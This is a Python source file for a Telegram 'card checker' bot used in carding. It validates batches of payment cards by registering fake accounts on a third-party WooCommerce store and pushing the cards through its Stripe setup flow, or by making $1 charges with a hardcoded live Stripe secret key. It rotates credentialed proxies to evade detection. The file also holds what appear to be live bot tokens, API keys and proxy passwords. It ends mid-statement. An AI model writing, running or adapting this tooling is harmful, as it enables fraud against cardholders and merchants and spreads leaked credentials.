import asyncio
import logging
import time
from datetime import datetime
import random
import re
from bs4 import BeautifulSoup
import httpx
import os
from typing import Optional, Dict, List
from collections import defaultdict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "8137441321:AAHYLJt2PcMXteMTKaEokI6fZXOQyStjnxA")
STRIPE_API_KEY = os.getenv("STRIPE_API_KEY", "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")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "8014397974")

# Proxy list - add multiple proxies here
PROXY_LIST = [
    "http://JwIpaiNQbXeuods1:5nakR36IkLwNaAvZ@geo.g-w.info:10080",
    "http://mQHCs1JCVFo0g118:FjN7hOaJ4e0EmTKP@geo.g-w.info:10080",
    "http://aJmxkXYYx4bKDjDp:QHDwvvfcZidhnevd@geo.g-w.info:10080",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888",
    "http://tUSbMq2FWvLWwGdGl:FeUgUIyaSbgTPcoY@geo.g-w.info:10080",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888"
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888"
    "http://npAt8bHeNbwIA6Xh:CauZC5O05MGL19zI@geo.g-w.info:10080",
    # Add more proxies:
    # "http://user:pass@proxy2.com:8080",
    # "http://user:pass@proxy3.com:8080",
]

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Rate limiting
last_chk_time: Dict[int, datetime] = {}
last_mass_time: Dict[int, datetime] = {}

# Bot and Dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== OPTIMIZED PROXY MANAGER ====================
class ProxyManager:
    """Manage multiple proxies with rotation and statistics"""
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = [p for p in proxy_list if p]
        self.current_index = 0
        self.working_proxies = []
        self.proxy_stats = defaultdict(lambda: {"success": 0, "fail": 0, "avg_time": 0})
        self.lock = asyncio.Lock()
        logger.info(f"📡 Loaded {len(self.proxies)} proxies")
    
    async def test_proxy(self, proxy: str) -> bool:
        """Test if proxy is working"""
        try:
            async with httpx.AsyncClient(proxy=proxy, timeout=20) as client:
                # Use a simple endpoint that doesn't block proxies
                response = await client.get("https://www.google.com", follow_redirects=True)
                return response.status_code == 200
        except Exception as e:
            logger.debug(f"Proxy test failed for {proxy[:30]}: {e}")
            return False
    
    async def quick_test_proxy(self, proxy: str) -> bool:
        """Fast proxy test (2 seconds)"""
        try:
            async with httpx.AsyncClient(proxy=proxy, timeout=20) as client:
                await client.get("https://httpbin.org/ip")
                return True
        except:
            return False
    
    async def get_working_proxy(self) -> Optional[str]:
        """Get proxy with automatic failover"""
        for proxy in self.working_proxies:
            if await self.quick_test_proxy(proxy):
                return proxy
        
        # If no proxy works, try to refresh
        logger.warning("No working proxies found, refreshing...")
        await self.refresh_proxies()
        return random.choice(self.working_proxies) if self.working_proxies else None
    
    async def refresh_proxies(self):
        """Refresh proxy list and test again"""
        logger.info("🔄 Refreshing proxy list...")
        self.working_proxies.clear()
        
        # Test all proxies again
        tasks = [self.test_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks)
        
        for proxy, is_working in zip(self.proxies, results):
            if is_working:
                self.working_proxies.append(proxy)
                logger.info(f"✅ Working proxy: {proxy[:30]}...")
        
        if not self.working_proxies:
            logger.warning("⚠️ No working proxies after refresh")
        else:
            logger.info(f"✅ {len(self.working_proxies)} working proxies after refresh")
    
    async def initialize(self):
        """Test all proxies in parallel and filter working ones"""
        logger.info("🔄 Testing proxies in parallel...")
        
        # Test all proxies concurrently
        tasks = [self.test_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks)
        
        for proxy, is_working in zip(self.proxies, results):
            if is_working:
                self.working_proxies.append(proxy)
                logger.info(f"✅ Working proxy: {proxy[:30]}...")
            else:
                logger.warning(f"❌ Dead proxy: {proxy[:30]}...")
        
        if not self.working_proxies:
            logger.warning("⚠️ No working proxies, will proceed without proxy")
        else:
            logger.info(f"✅ {len(self.working_proxies)} working proxies ready")
    
    def get_best_proxy(self) -> Optional[str]:
        """Get proxy with best success rate"""
        if not self.working_proxies:
            return None
        
        # If no stats yet, return random
        if not self.proxy_stats:
            return random.choice(self.working_proxies)
        
        # Find proxy with best success rate
        best_proxy = None
        best_score = -1
        
        for proxy in self.working_proxies:
            stats = self.proxy_stats[proxy]
            total = stats["success"] + stats["fail"]
            if total == 0:
                score = 0.5  # Neutral score for untested
            else:
                score = stats["success"] / total
            
            if score > best_score:
                best_score = score
                best_proxy = proxy
        
        return best_proxy or random.choice(self.working_proxies)
    
    def get_random_proxy(self) -> Optional[str]:
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.working_proxies:
            return None
        proxy = self.working_proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.working_proxies)
        return proxy
    
    async def record_result(self, proxy: Optional[str], success: bool, response_time: float):
        """Record proxy performance"""
        if not proxy:
            return
        
        async with self.lock:
            stats = self.proxy_stats[proxy]
            if success:
                stats["success"] += 1
            else:
                stats["fail"] += 1
            
            # Update average response time
            total = stats["success"] + stats["fail"]
            stats["avg_time"] = ((stats["avg_time"] * (total - 1)) + response_time) / total

# Initialize proxy manager
proxy_manager = ProxyManager(PROXY_LIST)

# ==================== HTTP CLIENT POOL ====================
class ClientPool:
    """Pool of HTTP clients for connection reuse"""
    
    def __init__(self):
        self.clients = {}
        self.lock = asyncio.Lock()
    
    async def get_client(self, proxy=None, timeout=15):
        """Get or create HTTP client for proxy"""
        proxy_key = proxy or "no_proxy"
        
        async with self.lock:
            if proxy_key not in self.clients:
                self.clients[proxy_key] = httpx.AsyncClient(
                    proxy=proxy, 
                    timeout=timeout,
                    follow_redirects=True
                )
            return self.clients[proxy_key]
    
    async def close_all(self):
        """Close all clients"""
        async with self.lock:
            for client in self.clients.values():
                await client.aclose()
            self.clients.clear()

# Initialize client pool
client_pool = ClientPool()

# ==================== UTILITIES ====================
def generate_fake_email() -> str:
    """Generate random email"""
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{random_string}@{random.choice(domains)}"

def parse_card_details(card_string: str) -> tuple:
    """Parse card details from string"""
    card_string = card_string.strip()
    cc, mm, yy, cvv = None, None, None, None

    match = re.search(r'(\d{13,19})[|/\s-]+(\d{1,2})[|/\s-]+(\d{2}|\d{4})[|/\s-]+(\d{3,4})', card_string)
    if match:
        cc, mm, yy, cvv = match.groups()
    else:
        temp = card_string
        cc_match = re.search(r'\d{13,19}', temp)
        if cc_match: 
            cc = cc_match.group(0)
            temp = temp.replace(cc, '', 1)
        mm_match = re.search(r'(?:MM:|M:)?\s*(\d{1,2})(?!\d)', temp)
        if mm_match: 
            mm = mm_match.group(1)
            temp = temp.replace(mm_match.group(0), '', 1)
        yy_match = re.search(r'(?:YY:|Y:)?\s*(\d{2}|\d{4})(?!\d)', temp)
        if yy_match: 
            yy = yy_match.group(1)
            temp = temp.replace(yy_match.group(0), '', 1)
        cvv_match = re.search(r'(?:CVV:|CVC:)?\s*(\d{3,4})(?!\d)', temp)
        if cvv_match: 
            cvv = cvv_match.group(1)

    if not all([cc, mm, yy, cvv]):
        return None, None, None, None

    try:
        mm_int = int(mm)
        if not (1 <= mm_int <= 12):
            return None, None, None, None
        current_year = datetime.now().year
        if len(yy) == 2:
            yy_full = int(f"20{yy}") if int(yy) >= (current_year % 100) else int(f"19{yy}")
        else:
            yy_full = int(yy)
        if not (current_year <= yy_full <= current_year + 15):
            return None, None, None, None
    except:
        return None, None, None, None

    return cc, str(mm_int).zfill(2), str(yy_full)[-2:], cvv

def format_card_result(status: str, card: str, message: str, extra_info: str = None) -> str:
    """Format card check result"""
    if status == "approved":
        emoji, status_text = "✅", "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif status == "declined":
        emoji, status_text = "❌", "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    elif status == "error":
        emoji, status_text = "⚠️", "𝗘𝗥𝗥𝗢𝗥"
    else:
        emoji, status_text = "ℹ️", "𝗜𝗡𝗙𝗢"
    
    result = f"{emoji} <b>{status_text}</b>\n━━━━━━━━━━━━━━━\n<code>{card}</code>\n━━━━━━━━━━━━━━━\n<b>Response:</b> {message}\n"
    if extra_info:
        result += f"<b>Info:</b> {extra_info}\n"
    result += "━━━━━━━━━━━━━━━"
    return result

def clean_error_message(error_str: str) -> str:
    """Clean error messages"""
    error_str = str(error_str)
    if "for url:" in error_str.lower():
        error_str = error_str.split("for url:")[0].strip()
    if "https://" in error_str or "http://" in error_str:
        error_str = "Service temporarily unavailable"
    return error_str[:200]

async def show_progress(message, current, total, gateway):
    """Show progress bar for mass checks"""
    progress_bar = "█" * int((current/total) * 10)
    empty_bar = "░" * (10 - len(progress_bar))
    percentage = int((current/total) * 100)
    
    progress_text = f"""
🔄 <b>{gateway} Processing</b>
{progress_bar}{empty_bar} {percentage}%
<b>{current}/{total}</b> cards processed
    """
    
    try:
        await message.edit_text(progress_text, parse_mode='HTML')
    except:
        pass  # Ignore edit errors

# ==================== STRIPE AUTH CHECKER ====================
async def stripe_auth_check_card(card: str) -> str:
    """Check card via Stripe Auth gateway"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = await proxy_manager.get_working_proxy()
    success = False
    
    try:
        client = await client_pool.get_client(proxy=proxy, timeout=30)
        mail = generate_fake_email()
        
        headers = {
            'authority': 'bahamabos.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        
        # Step 1: Get registration page
        response = await client.get('https://bahamabos.com/my-account/', headers=headers)
        if response.status_code != 200:
            raise Exception("Failed to load page")
        
        soup = BeautifulSoup(response.text, 'lxml')
        nonce = soup.find(id="woocommerce-register-nonce")
        if not nonce:
            raise Exception("Nonce not found")
        nonce_value = nonce.get("value")
        
        # Step 2: Register account
        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bahamabos.com',
            'referer': 'https://bahamabos.com/my-account/',
            'sec-fetch-site': 'same-origin'
        })
        
        register_data = {
            'email': mail,
            'woocommerce-register-nonce': nonce_value,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = await client.post('https://bahamabos.com/my-account/', headers=headers, data=register_data)
        if response.status_code != 200:
            raise Exception("Registration failed")
        
        # Step 3: Get add payment method page
        headers.pop('content-type', None)
        headers['referer'] = 'https://bahamabos.com/my-account/'
        
        response = await client.get('https://bahamabos.com/my-account/add-payment-method/', headers=headers)
        if response.status_code != 200:
            raise Exception("Failed to load payment page")
        
        soup = BeautifulSoup(response.text, 'lxml')
        
        # Extract AJAX nonce
        ajax_nonce = None
        for script in soup.find_all('script'):
            if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                if match:
                    ajax_nonce = match.group(1)
                    break
        
        if not ajax_nonce:
            raise Exception("Ajax nonce not found")
        
        # Step 4: Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': headers['user-agent'],
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "billing_details[address][country]": "IN",
            "key": "pk_live_axb2b6B9U2aIqQq93VRd6qF6009oO6P3ds",
        }
        
        response = await client.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        
        if response.status_code != 200:
            pm_json = response.json()
            error_msg = pm_json.get("error", {}).get("message", "Card declined")
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
        
        pm_json = response.json()
        pm_id = pm_json.get("id")
        
        if not pm_id:
            raise Exception("Payment method ID not found")
        
        # Step 5: Confirm setup intent
        final_headers = headers.copy()
        final_headers.update({
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'referer': 'https://bahamabos.com/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
        })
        
        final_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response = await client.post('https://bahamabos.com/wp-admin/admin-ajax.php', headers=final_headers, data=final_data)
        
        if response.status_code == 403:
            raise Exception("Service temporarily unavailable")
        
        if response.status_code != 200:
            raise Exception("Service temporarily unavailable")
        
        result_json = response.json()
        time_taken = time.time() - start_time
        success = True
        
        if result_json.get("success"):
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("approved", card, "Card Approved Successfully! ✅", f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
        else:
            error_data = result_json.get("data", {})
            error = error_data.get("error", {})
            error_msg = error.get("message", "Payment declined")
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"Stripe Auth check failed: {e}")
        return format_card_result("error", card, "Service temporarily unavailable", f"Gateway: Stripe Auth | Time: {time_taken:.2f}s")

# ==================== SK BASED 1$ CHECKER ====================
async def sk_based_check_card(card: str) -> str:
    """Check card via SK Based 1$ API with Authorization header"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = await proxy_manager.get_working_proxy()
    pk_key = "pk_live_51QuMQyFFXXyXZOvgkBdCd4rvxl6TUW7f8GrF33AiWxQXCcNaHpc8TAjoj5FgoJlBOqOZD6XuBozhBuA6FWZq3Wbi00ATd45WZb"
    
    try:
        full_year = f"20{yy}" if len(yy) == 2 else yy
        
        client = await client_pool.get_client(proxy=proxy, timeout=15)
        # Step 1: Create Payment Method using Authorization header with pk_key
        import uuid
        pm_data = {
            "type": "card",
            "billing_details[name]": "John Doe",
            "billing_details[address][city]": "New York",
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": "123 Main St",
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm.zfill(2),
            "card[exp_year]": full_year,
            "guid": str(uuid.uuid4()),
            "muid": str(uuid.uuid4()),
            "sid": str(uuid.uuid4()),
            "payment_user_agent": "stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element",
            "time_on_page": str(random.randint(10021, 10090)),
        }
        
        pm_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {pk_key}",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        
        response = await client.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_data)
        
        text = response.text
        if "Invalid API Key provided" in text or "testmode_charges_only" in text or "api_key_expired" in text:
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, False, time_taken)
            return format_card_result("error", card, "API key expired or invalid", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        if response.status_code != 200:
            try:
                pm_json = response.json()
                error_msg = pm_json.get("error", {}).get("message", "Payment method creation failed")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
            except:
                error_msg = "Payment method creation failed"
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("declined", card, error_msg, f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        try:
            pm_json = response.json()
            payment_method_id = pm_json["id"]
        except:
            time_taken = time.time() - start_time
            await proxy_manager.record_result(proxy, False, time_taken)
            return format_card_result("error", card, "Unexpected response (no ID)", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        
        # Step 2: Create Payment Intent using sk_live
        pi_data = {
            "amount": 100,
            "currency": "usd",
            "payment_method_types[]": "card",
            "payment_method": payment_method_id,
            "confirm": "true",
            "off_session": "true",
            "use_stripe_sdk": "true",
            "description": "Card verification",
            "receipt_email": generate_fake_email(),
            "metadata[order_id]": str(random.randint(100000000000000000, 999999999999999999)),
        }
        
        pi_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {STRIPE_API_KEY}",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        
        response = await client.post("https://api.stripe.com/v1/payment_intents", headers=pi_headers, data=pi_data)
        text = response.text
        
        time_taken = time.time() - start_time
        
        try:
            json_res = response.json()
            
            if "requires_action" in text or "requires_source_action" in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, "3D Secure Required", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("approved", card, "CVV Live ✅", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            if "error" in text:
                if "decline_code" in json_res.get("error", {}):
                    msg = json_res["error"]["decline_code"].replace("_", " ").title()
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, msg, f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
                else:
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, json_res["error"]["message"], f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            
            elif "succeeded" in text or json_res.get("status") == "succeeded" or "success:true" in text:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("approved", card, "Charged 🔥", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
            else:
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("error", card, "Unexpected response", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
        except:
            await proxy_manager.record_result(proxy, True, time_taken)
            return format_card_result("error", card, "Unexpected response", f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"SK Based 1$ check failed: {e}")
        return format_card_result("error", card, clean_error_message(str(e)), f"Gateway: SK Based 1$ | Time: {time_taken:.2f}s")

# ==================== COMMAND HANDLERS ====================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    """Start command"""
    welcome_msg = (
        "🤖 <b>Welcome to Putin Checker Bot!</b>\n━━━━━━━━━━━━━━━\n\n"
        "<b>Stripe Auth Gateway:</b>\n"
        "• <code>/chk CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mass</code> - Mass check (parallel)\n\n"
        "<b>SK Based 1$:</b>\n"
        "• <code>/st CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mst</code> - Mass check (parallel)\n\n"
        "━━━━━━━━━━━━━━━\n⚡ <b>Fast • Parallel • Optimized</b>\n\n"
        "💡 Use <code>/cmds</code> for detailed help\n"
        "📊 Use <code>/status</code> to check bot status"
    )
    await message.answer(welcome_msg, parse_mode='HTML')

@dp.message(Command("cmds"))
async def cmd_cmds(message: Message):
    """Detailed commands help"""
    help_text = """
🤖 <b>Card Checker Bot - Commands</b>
━━━━━━━━━━━━━━━

<b>🔍 Single Card Checks:</b>
• <code>/chk 4532111111111111|12|25|123</code>
  └ Stripe Auth Gateway (single check)
• <code>/st 4532111111111111|12|25|123</code>
  └ SK Based 1$ (single check)

<b>📦 Mass Card Checks:</b>
• <code>/mass</code>
  └ Stripe Auth Gateway (up to 15 cards)
• <code>/mst</code>
  └ SK Based 1$ (up to 15 cards)

<b>📋 Supported Card Formats:</b>
• <code>4532111111111111|12|25|123</code>
• <code>4532111111111111/12/25/123</code>
• <code>4532111111111111 12 25 123</code>
• <code>4532111111111111-12-25-123</code>

<b>⏱️ Rate Limits:</b>
• Single checks: 5 second cooldown
• Mass checks: 20 second cooldown
• Max cards per mass check: 15

<b>🌐 Available Gateways:</b>
• <b>Stripe Auth:</b> Advanced authentication gateway
• <b>SK Based 1$:</b> Real $1 charge verification

<b>🔧 Utility Commands:</b>
• <code>/status</code> - Check bot status and health

━━━━━━━━━━━━━━━
⚡ <b>Fast • Reliable • Secure</b>
    """
@dp.message(Command("status"))
async def cmd_status(message: Message):
    """Show bot status"""
    working_proxies = len(proxy_manager.working_proxies)
    total_proxies = len(proxy_manager.proxies)
    active_clients = len(client_pool.clients)
    
    # Calculate proxy success rate
    total_stats = sum(proxy_manager.proxy_stats.values(), {"success": 0, "fail": 0})
    total_requests = total_stats["success"] + total_stats["fail"]
    proxy_success_rate = (total_stats["success"] / max(total_requests, 1)) * 100
    
    status_text = f"""
🤖 <b>Bot Status</b>
━━━━━━━━━━━━━━━
<b>Status:</b> ✅ Online
<b>Working Proxies:</b> {working_proxies}/{total_proxies}
<b>Proxy Success Rate:</b> {proxy_success_rate:.1f}%
<b>Active Clients:</b> {active_clients}
<b>Current Time:</b> {datetime.now().strftime('%H:%M:%S')}

<b>Gateways:</b>
• Stripe Auth: ✅ Active
• SK Based 1$: ✅ Active

━━━━━━━━━━━━━━━
⚡ <b>All Systems Operational</b>
    """
    await message.answer(status_text, parse_mode='HTML')

@dp.message(Command("chk"))
async def cmd_chk(message: Message):
    """Stripe Auth Gateway single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/chk CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/chk 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> Stripe Auth",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>Stripe Auth Gateway checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await stripe_auth_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mass"))
async def cmd_mass(message: Message):
    """Stripe Auth Gateway mass check with parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mass\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> Stripe Auth\n"
            "<b>Mode:</b> Parallel processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # Limit to 15 cards for all users
    if len(cards_to_check) > 15:
        cards_to_check = cards_to_check[:15]
        await message.answer("⚠️ Limited to 15 cards", parse_mode='HTML')
    
    total_cards = len(cards_to_check)
    
    progress_msg = await message.answer(
        f"🚀 Processing {total_cards} cards in parallel via Stripe Auth Gateway...",
        parse_mode='HTML'
    )
    
    # Process all cards in parallel
    start_time = time.time()
    tasks = [stripe_auth_check_card(card) for card in cards_to_check]
    results = await asyncio.gather(*tasks)
    total_time = time.time() - start_time
    
    # Send results with progress
    for idx, result in enumerate(results, 1):
        await show_progress(progress_msg, idx, total_cards, "Stripe Auth")
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    await message.answer(
        f"✅ Completed {total_cards} cards in {total_time:.2f}s\n"
        f"⚡ Average: {total_time/total_cards:.2f}s per card",
        parse_mode='HTML'
    )

@dp.message(Command("st"))
async def cmd_st(message: Message):
    """SK Based 1$ single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/st CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/st 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> SK Based 1$",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>SK Based 1$ checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await sk_based_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mst"))
async def cmd_mst(message: Message):
    """SK Based 1$ mass check with parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mst\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> SK Based 1$\n"
            "<b>Mode:</b> Parallel processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # Limit to 15 cards for all users
    if len(cards_to_check) > 15:
        cards_to_check = cards_to_check[:15]
        await message.answer("⚠️ Limited to 15 cards", parse_mode='HTML')
    
    total_cards = len(cards_to_check)
    
    progress_msg = await message.answer(
        f"🚀 Processing {total_cards} cards in parallel via SK Based 1$...",
        parse_mode='HTML'
    )
    
    # Process all cards in parallel
    start_time = time.time()
    tasks = [sk_based_check_card(card) for card in cards_to_check]
    results = await asyncio.gather(*tasks)
    total_time = time.time() - start_time
    
    # Send results with progress
    for idx, result in enumerate(results, 1):
        await show_progress(progress_msg, idx, total_cards, "SK Based 1$")
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    await message.answer(
        f"✅ Completed {total_cards} cards in {total_time:.2f}s\n"
        f"⚡ Average: {total_time/total_cards:.2f}s per card",
        parse_mode='HTML'
    )

# ==================== MAIN ====================
async def main():
    """Main function to start bot"""
    logger.info("🤖 Bot starting...")
    
    # Initialize proxies in parallel
    await proxy_manager.initialize()
    
    logger.info("✅ Bot started successfully!")
    try:
        await dp.start_polling(bot)
    finally:
        # Close all HTTP clients
        await client_pool.close_all()
        logger.info("🔌 HTTP clients closed")

if __name__ == '__main__':
    try:
